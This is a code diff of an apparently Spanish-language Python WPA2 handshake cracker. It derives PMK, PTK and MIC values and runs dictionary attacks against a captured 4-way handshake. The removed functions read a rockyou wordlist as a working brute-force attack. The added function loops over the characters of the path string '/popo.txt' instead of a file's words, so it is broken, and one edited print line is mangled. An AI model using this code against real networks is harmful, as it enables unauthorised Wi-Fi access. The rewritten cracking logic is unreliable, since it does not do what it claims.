@@ -33,6 +33,9 @@ def banner():
 # VARIABLES
 #
 
+## Variables Globales
+wordlist = "/popo.txt" 
+
 ## Variables que necesita el 4-Way-Handshake:
 class WPA2Handshake:
     ssid = ''
@@ -261,10 +264,8 @@ def main():
 def passmode():
     while True:  # Start an infinite loop to keep showing the options until the user exits
         try:
-
             # Call ViewData Function: Display data related to the WPA2 handshake or relevant info 
-
-            viewdata()  
+            viewdata()
             
             print(f"{BOLD}{WHITE}###{RED} ATTACK SELECTION:{RESET}")
             print()
@@ -283,8 +284,7 @@ def passmode():
                 main()  # Call the main function (presumably to go back to the main menu)
             elif opt == 1:
                 print("Initiating Bruteforce attack...\n")  # Notify the user that brute-force attack is starting
-                checkPasswdWordlist()  # Execute the brute-force attack (this function should be defined elsewhere)
-            # Manual Password
+                crack_password_with_wordlist(wordlist)  # Usa la variable global 'wordlist'
             elif opt == 0:
                 print("Please input the password you wish to audit or press Enter to use the default (Hunter2006).")  # Prompt to manually input a password
                 WPA2Handshake.passw = input("--> ") or "Hunter2006"  # Allow user input, defaulting to "Hunter2006" if none is entered
@@ -299,8 +299,6 @@ def passmode():
                 print("Invalid selection. Please enter a valid option (0, 1, or 9).\n")  # Inform the user of invalid input if it's not 0, 1, or 9
         except ValueError:  # Catch any ValueError if the input is not an integer
             print("Error: Invalid input. Please enter a valid number (0, 1, or 9).\n")  # Inform the user that their input is invalid
-
-
 
 
 
@@ -336,8 +334,7 @@ def checkPasswd():
 
     ## CREAR Y MOSTRAR PMK
 
-    print()
-    print(F"{BOLD}{WHITE}###{RED} PMK (Pairwise Master Key) DERIVATION || PBKDF2 KDF (Key Derivation Function):")
+    print(f"{BOLD}{WHITE}###{RED} PMK (Pairwise Master Key) DERIVATION || PBKDF2 KDF (Key Derivation Function):")
     print()
     print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {YELLOW}PMK = 256-bit Key derived from Passphrase & SSID using PBKDF2, provides the foundation for RSNA keys in WPA2 authentication." + RESET)    
     print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {YELLOW}The PMK derives the PTK, which divides into -> KCK for MIC integrity; KEK for EAPOL message encryption; TK for data encryption; and MIC keys for data integrity." + RESET)    
@@ -351,7 +348,9 @@ def checkPasswd():
     PMK = PBKDF2(WPA2Handshake.passw, WPA2Handshake.ssid, 4096).read(32)
 
     # Imprimir PMK:
-    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} PMK:................... " + str(PMK.hex()))
+    
+    print(f"{BOLD}{WHITE}###{RED} PMK Result:\n")
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} PMK:................... {WHITE}{BOLD}" + str(PMK.hex()))
     print()
 
     ##########################################################################
@@ -360,7 +359,7 @@ def checkPasswd():
     ## CREAR Y MOSTRAR PTK
 
     print()
-    print("[+]Generating PTK...")
+    print(f"{WHITE}[{NEON_GREEN}+{WHITE}Generating PTK...{RESET}")
     print()
 
     ## Proceso para generar la PTK
@@ -540,122 +539,49 @@ def checkPasswd():
 
 
 
-def checkPasswdWordlist():
 
 
-    # Solicitar la ruta del wordlist si se desea cambiar el default
-    wordlist_path = input("Ingrese la ruta del wordlist (presione Enter para usar '/usr/share/wordlists/rockyou.txt'): ")
-    if not wordlist_path:
-        wordlist_path = '/usr/share/wordlists/rockyou.txt'
 
-    # Verificar que el archivo de wordlist existe
-    if not os.path.isfile(wordlist_path):
-        print(f"No se encontró el archivo de wordlist en: {wordlist_path}")
-        return
+def crack_password_with_wordlist(wordlist):
+    for passphrase in wordlist:
+        WPA2Handshake.passw = passphrase.strip()  # Asigna la palabra de la wordlist como passphrase actual
+        
+        ## CREAR Y MOSTRAR PMK
+        print(f"\n{BOLD}{WHITE}### {RED} PMK (Pairwise Master Key) DERIVATION || PBKDF2 KDF (Key Derivation Function):")
+        print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {YELLOW}PMK = 256-bit Key derived from Passphrase & SSID using PBKDF2, provides the foundation for RSNA keys in WPA2 authentication." + RESET)    
+        print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {YELLOW}The PMK derives the PTK, which divides into -> KCK for MIC integrity; KEK for EAPOL message encryption; TK for data encryption; and MIC keys for data integrity." + RESET)    
+        print(f"{BOLD}{WHITE}PMK Formula -->{RESET} {BOLD} {GREEN}PBKDF2 {WHITE}= {WHITE}({RED}Passphrase {WHITE}+ {PURPLE}SSID{WHITE}) & {CYAN}4096 iterations >> {PINK}read(32byte){RESET}")
+        PMK = PBKDF2(WPA2Handshake.passw, WPA2Handshake.ssid, 4096).read(32)
+        print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} PMK:................... " + str(PMK.hex()))
 
-    # Leer el wordlist y probar cada palabra como contraseña
-    with open(wordlist_path, 'r', encoding='latin-1') as wordlist_file:
-        for passw_wordlist in wordlist_file:
-            passw_wordlist = passw_wordlist.strip()  # Quitar espacios en blanco
+        ## CREAR Y MOSTRAR PTK
+        print("[+] Generating PTK...")
+        macAPparsed = binascii.a2b_hex(WPA2Handshake.macAP.replace(":", "").lower())
+        macCliparsed = binascii.a2b_hex(WPA2Handshake.macCli.replace(":", "").lower())
+        anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
+        snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
+        key_data = min(macAPparsed, macCliparsed) + max(macAPparsed, macCliparsed) + min(anoncep, snoncep) + max(anoncep, snoncep)
+        txt = b"Pairwise key expansion"
+        PTK = customPRF512(PMK, txt, key_data)
+        print("Pairwise Temporal Key (PTK): " + str(PTK.hex()))
 
-            print()
-            print(f"Probando contraseña: {passw_wordlist}")
-            print()
+        ## CALCULAR Y MOSTRAR MIC
+        KCK = PTK[0:16]
+        eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]
+        calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
 
-            # Generar PMK
-            print("\n[+] Generating PMK via PBKDF2...\n")
-            PMK = PBKDF2(passw_wordlist, WPA2Handshake.ssid, 4096).read(32)
-            print("Pairwise Master Key (PMK): " + str(PMK.hex()) + "\n")
+        print("        [*] MIC Calculada :  "+str(calculated_mic.hex()))
+        print("        [*] MIC capturada :  "+str(WPA2Handshake.mic))
 
-            # Generar PTK
-            print("\n[+] Generating PTK...\n")
-            macAPparsed = binascii.a2b_hex(WPA2Handshake.macAP.replace(":", "").lower())
-            macCliparsed = binascii.a2b_hex(WPA2Handshake.macCli.replace(":", "").lower())
-            anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
-            snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
-            key_data = min(macAPparsed, macCliparsed) + max(macAPparsed, macCliparsed) + min(anoncep, snoncep) + max(anoncep, snoncep)
-            txt = b"Pairwise key expansion"
-            PTK = customPRF512(PMK, txt, key_data)
-            print("Pairwise Temporal Key (PTK): " + str(PTK.hex()) + "\n")
+        if calculated_mic.hex() == WPA2Handshake.mic:
+            print("\n####################\n# Password Correct #\n####################\n")
+            break  # Sale del bucle si la contraseña es correcta
+        else:
+            print("\n######################\n# Password Incorrect #\n######################\n")
 
-            # Calcular y mostrar MIC
-            print("\n######################")    
-            print("#   Calculando MIC   #")
-            print("######################\n")
-            KCK = PTK[0:16]
-            eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]
-            calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
-            print("MIC Calculada:  " + str(calculated_mic.hex()))
-            print("MIC capturada:  " + str(WPA2Handshake.mic) + "\n")
-
-            # Comparar MICs
-            if calculated_mic.hex() == WPA2Handshake.mic:
-                print(f"\n####################")
-                print(f"# Password Correct!!! -->> {passw_wordlist} #")
-                print(f"####################\n")
-                input("Presiona Enter para salir...")  # Pausar la ejecución hasta que el usuario presione Enter
-                return  # Detener la función si se encuentra la contraseña correcta
-
-            else:
-                print("\n######################")
-                print("# Password Incorrect #")
-                print("######################\n")
-
-                banner()
-
-def checkPasswdWordlist():
-    # Solicitar la ruta del wordlist si se desea cambiar el default
-    wordlist_path = input("Ingrese la ruta del wordlist (presione Enter para usar '/usr/share/wordlists/rockyou.txt'): ")
-    if not wordlist_path:
-        wordlist_path = '/usr/share/wordlists/rockyou.txt'
-
-    # Verificar que el archivo de wordlist existe
-    if not os.path.isfile(wordlist_path):
-        print(f"No se encontró el archivo de wordlist en: {wordlist_path}")
-        return
-
-    # Leer el wordlist y probar cada palabra como contraseña
-    with open(wordlist_path, 'r', encoding='latin-1') as wordlist_file:
-        for passw_wordlist in wordlist_file:
-            passw_wordlist = passw_wordlist.strip()  # Quitar espacios en blanco
-            
- 
-            
-            banner()
-            print(f"Probando contraseña: {passw_wordlist}")
-
-            # Generar PMK
-            PMK = PBKDF2(passw_wordlist, WPA2Handshake.ssid, 4096).read(32)
-            print("Pairwise Master Key (PMK): " + str(PMK.hex()) + "\n")
-            
-            # Generar PTK
-            macAPparsed = binascii.a2b_hex(WPA2Handshake.macAP.replace(":", "").lower())
-            macCliparsed = binascii.a2b_hex(WPA2Handshake.macCli.replace(":", "").lower())
-            anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
-            snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
-            key_data = min(macAPparsed, macCliparsed) + max(macAPparsed, macCliparsed) + min(anoncep, snoncep) + max(anoncep, snoncep)
-            txt = b"Pairwise key expansion"
-            PTK = customPRF512(PMK, txt, key_data)
-            print("Pairwise Temporal Key (PTK): " + str(PTK.hex()) + "\n")
-
-
-            # Calcular y mostrar MIC
-            KCK = PTK[0:16]
-            eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]
-            calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
-
-            # Comparar MICs
-            if calculated_mic.hex() == WPA2Handshake.mic:
-                print(f"\n####################")
-                print(f"# Password Correcta!!! -->> {passw_wordlist} #")
-                print(f"####################\n")
-                input("Presiona Enter para salir...")  # Pausar la ejecución hasta que el usuario presione Enter
-                return  # Detener la función si se encuentra la contraseña correcta
-            else:
-                print("Password Incorrecta")
-                           # Limpiar pantalla para solo ver el último intento
-
-                            # Limpiar pantalla para solo ver el último intento
+    
+    else:
+        print("All passwords in the wordlist have been tried and none were correct.")
 
 
 
